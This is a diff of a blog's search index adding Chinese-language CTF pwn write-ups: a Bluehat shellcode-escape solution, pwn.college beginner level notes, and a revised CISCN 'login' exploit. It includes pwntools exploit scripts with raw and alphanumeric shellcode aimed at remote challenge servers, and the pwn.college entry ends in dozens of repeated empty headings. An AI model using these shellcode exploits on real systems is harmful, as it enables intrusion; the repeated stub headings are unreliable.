@@ -1,12 +1,90 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2022 bluehat</title>
+    <url>/2022/07/10/2022-07-10-bluehat/</url>
+    <content><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="EscapeShellcode"><a href="#EscapeShellcode" class="headerlink" title="EscapeShellcode"></a>EscapeShellcode</h2><p>程序会申请一块堆地址，拥有执行权限，把每个寄存器都设为了0xdeadbeef。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160145324.png"><span class="image-caption">image-20220710160145324</span></p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160128054.png"><span class="image-caption">image-20220710160128054</span></p>
+<p>同时开启沙箱，只允许调用write。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160040693.png"><span class="image-caption">image-20220710160040693</span></p>
+<p>程序会读取flag放入到bss上。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160333732.png"><span class="image-caption">image-20220710160333732</span></p>
+<p>最后就是进输入，再把我们输入内容进行调用，所以就是要去写shellcode，从而把bss上的flag读出来。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160252649.png"><span class="image-caption">image-20220710160252649</span></p>
+<p>我的思路为：因为开启沙箱，那么就会存在许多的堆块，这些堆块上是会存在脏数据的，通过数据得到libc地址，再去读取出libc中的environ变量，得到其中的栈地址，在通过栈上存放的程序地址而得到bss地址，最后输出flag。</p>
+<p>清空寄存器。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160709797.png"><span class="image-caption">image-20220710160709797</span></p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160728217.png"><span class="image-caption">image-20220710160728217</span></p>
+<p>得到脏数据。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160841237.png"><span class="image-caption">image-20220710160841237</span></p>
+<p>得到PIE。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160913734.png"><span class="image-caption">image-20220710160913734</span></p>
+<p>成功打印flag。</p>
+<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710161001175.png"><span class="image-caption">image-20220710161001175</span></p>
+<p>该方法有缺陷，在于environ在不同的版本的偏移不同，所以需要找对libc版本，限制较大。</p>
+<p>其他师傅的思路：直接打印数据，循环打印，从堆地址开始往上打印内容，直到打印出flag停止。这个就不需要版本内容，简单粗暴。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./escape_shellcode&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(<span class="hljs-string">&#x27;./escape_shellcode&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;39.107.108.120&#x27;</span><br>    port = <span class="hljs-number">29356</span> <br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	<span class="hljs-comment">#gdb.attach(p, &quot;b main&quot;)</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b *$rebase(0x1367)&quot;</span>)<br>	<br>	<br><span class="hljs-comment">#debug()</span><br>shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rdx, 0x80</span><br><span class="hljs-string">mov rcx, [rip + 0x1cb8]</span><br><span class="hljs-string">shr rcx, 8</span><br><span class="hljs-string">add rcx, 0x12c0</span><br><span class="hljs-string">mov rbx, [rcx]</span><br><span class="hljs-string">sub rbx, 0x221c08</span><br><span class="hljs-string">mov rsi, [rbx]</span><br><span class="hljs-string">sub rsi, 0xb8</span><br><span class="hljs-string">mov rsi, [rsi]</span><br><span class="hljs-string">add rsi, 0x2f80</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">syscall                </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcode)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>因为少个队友，被迫去做了电子取证，加上上一题pwn卡了挺久，这题没机会做了，赛后复现的。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pwn.college</title>
+    <url>/2022/07/07/2022-07-07-pwn-college-1/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟着pwn.college把之前因为CTF而略过的基础知识一点点的补回来，同时打好基础，更上一步吧。</p>
+<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>第一题到challenge下执行一下程序即可获得flag。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220707213622251.png"><span class="image-caption">image-20220707213622251</span></p>
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>第二个相比于第一个需要一个密码才行，而密码在执行文件里面，所以需要把ELF文件下下来，这边采用的是MobaXterm，直接拖拽就行了。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220707221800286.png"><span class="image-caption">image-20220707221800286</span></p>
+<p>密码就在文件里面藏着，输入即可。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220707222150003.png"><span class="image-caption">image-20220707222150003</span></p>
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>第三题根据报错提示，需要增加一个参数，所以在执行文件时在后面加入缺少的参数即可。</p>
+<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>第四题根据报错信息，lmfmk环境变量的值要为wgwocxkpq，所以按要求添加即可。</p>
+<p>使用下方命令可添加环境变量，也可以修改环境变量的值。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">export lmfmk=wgwocxkpq<br></code></pre></td></tr></table></figure>
+
+<p>另：<code>env</code> 命令可以查看环境变量。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712205412432.png"><span class="image-caption">image-20220712205412432</span></p>
+<p>还可以使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env lmfmks=wgwocwxkpq ./embryoio_level4<br></code></pre></td></tr></table></figure>
+
+<p>这样不会像<code>export</code>直接改变所有的环境变量，而是在执行程序时把提供的值作为其的一个环境变量进行执行，只是一个暂时的环境变量。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712222710729.png"><span class="image-caption">image-20220712222710729</span></p>
+<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p>第五题考查重定向的输入问题，根据提示，需要在/tmp下创建一个文件重定向作为输入传递给执行文件。</p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">./embryoio_level5&lt;<span class="hljs-regexp">/tmp/</span>ppbnrh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712210721144.png"><span class="image-caption">image-20220712210721144</span></p>
+<p>输入后，还要求了一个密码，把文件内容改为密码即可。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712215856399.png"><span class="image-caption">image-20220712215856399</span></p>
+<p>注：重定向符号左边的是执行程序或者命令，右边是文件。也就是说按照下面这么写是无法进行重定向的。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./embryoio_level5&lt;/tmp/ppbnrh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712220534198.png"><span class="image-caption">image-20220712220534198</span></p>
+<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p>第六题考察的也是重定向，这回考察的是输出的重定向。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712222042053.png"><span class="image-caption">image-20220712222042053</span></p>
+<p>将程序的输出重定向到给出的/tmp下的文件，然后输出文件内容，便是flag。</p>
+<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>第七题要求执行程序时，程序的环境变量为空。</p>
+<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712222310394.png"><span class="image-caption">image-20220712222310394</span></p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env -i ./embryoio_level7<br></code></pre></td></tr></table></figure>
+
+<p>即可设置执行程序的环境变量为空。</p>
+<h1 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-7"><a href="#level5-7" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-8"><a href="#level5-8" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-9"><a href="#level5-9" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-10"><a href="#level5-10" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-11"><a href="#level5-11" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-12"><a href="#level5-12" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-13"><a href="#level5-13" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-14"><a href="#level5-14" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-15"><a href="#level5-15" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-16"><a href="#level5-16" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-17"><a href="#level5-17" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-18"><a href="#level5-18" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-19"><a href="#level5-19" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-20"><a href="#level5-20" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-21"><a href="#level5-21" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-22"><a href="#level5-22" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-23"><a href="#level5-23" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-24"><a href="#level5-24" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-25"><a href="#level5-25" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-26"><a href="#level5-26" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-27"><a href="#level5-27" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-28"><a href="#level5-28" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-29"><a href="#level5-29" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-30"><a href="#level5-30" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-31"><a href="#level5-31" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-32"><a href="#level5-32" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-33"><a href="#level5-33" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-34"><a href="#level5-34" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-35"><a href="#level5-35" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-36"><a href="#level5-36" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-37"><a href="#level5-37" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-38"><a href="#level5-38" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-39"><a href="#level5-39" class="headerlink" title="level5"></a>level5</h1><p>v</p>
+<h1 id="level5-40"><a href="#level5-40" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-41"><a href="#level5-41" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-42"><a href="#level5-42" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-43"><a href="#level5-43" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-44"><a href="#level5-44" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-45"><a href="#level5-45" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-46"><a href="#level5-46" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-47"><a href="#level5-47" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-48"><a href="#level5-48" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-49"><a href="#level5-49" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-50"><a href="#level5-50" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-51"><a href="#level5-51" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-52"><a href="#level5-52" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-53"><a href="#level5-53" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-54"><a href="#level5-54" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-55"><a href="#level5-55" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-56"><a href="#level5-56" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-57"><a href="#level5-57" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-58"><a href="#level5-58" class="headerlink" title="level5"></a>level5</h1>]]></content>
+      <tags>
+        <tag>pwn.college</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022ciscn pwn</title>
     <url>/2022/07/05/2022-07-05-2022ciscn-pwn/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年ciscn线上赛总共三题pwn，一题算是签到，一题2.34的堆做一半没成功，一题LLVM PASS没学过完全不会。分区赛六题pwn，awdplus的模式，成了修洞的乐园。</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年ciscn总共三题pwn，一题算是签到，一题2.34的堆做一半没成功，一题LLVM PASS没学过完全不会。分区赛六题pwn，awdplus的模式，成了修洞的乐园。</p>
 <h1 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h1><p>这题其实做过类似的，在蓝帽杯还是哪来着做过，在代码审计部分差不多一致，只是在最后的利用过程有改动。首先就是一个循环执行函数，接着看函数的主要内容。</p>
 <p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213148416.png"><span class="image-caption">image-20220705213148416</span></p>
-<p>接着看又是一个循环，这个循环就是这题最麻烦的点了，需要一步步的耐心整理，当时我做是直接找了类似题目进行比较的，所以没花多少功夫。</p>
+<p>接着看又是一个循环，这个循环就是这题最麻烦的点了，需要一步步的耐心整理，当时我做是直接找了类似题目进行比较的，所以没花多少功夫，需要注意一下的就是msg后跟的字符串要多输入一个，因为处理的时候strlen-1了，会少一个字符。</p>
 <p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213257184.png"><span class="image-caption">image-20220705213257184</span></p>
 <p>审完上面的代码，接下来就是主要的菜单内容，主要关注1和3执行的内容。</p>
 <p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213831271.png"><span class="image-caption">image-20220705213831271</span></p>
@@ -16,7 +94,7 @@
 <p>rdx是指call后面跟着的那个寄存器，也就是存放shellcode首地址的寄存器。</p>
 <p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213700566.png"><span class="image-caption">image-20220705213700566</span></p>
 <p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213732318.png"><span class="image-caption">image-20220705213732318</span></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>    p = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;47.93.156.2&#x27;</span><br>    port = <span class="hljs-number">24875</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br> <br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opt:1\nmsg:ro0ta\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><span class="hljs-comment">#debug()</span><br>p.send(<span class="hljs-string">&quot;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070ta\n\r\r\n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>    p = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;47.93.156.2&#x27;</span><br>    port = <span class="hljs-number">24875</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br> <br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opt:1\nmsg:ro0ta\n\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><span class="hljs-comment">#debug()</span><br>p.send(<span class="hljs-string">&quot;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070ta\n\n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>这题跑去问了柘狐师傅，也是个签到题。但是比赛那会没做出来，太菜了。</p>
 <p>利用点在于black初始值是为0的，那么没有过滤<code>..</code></p>
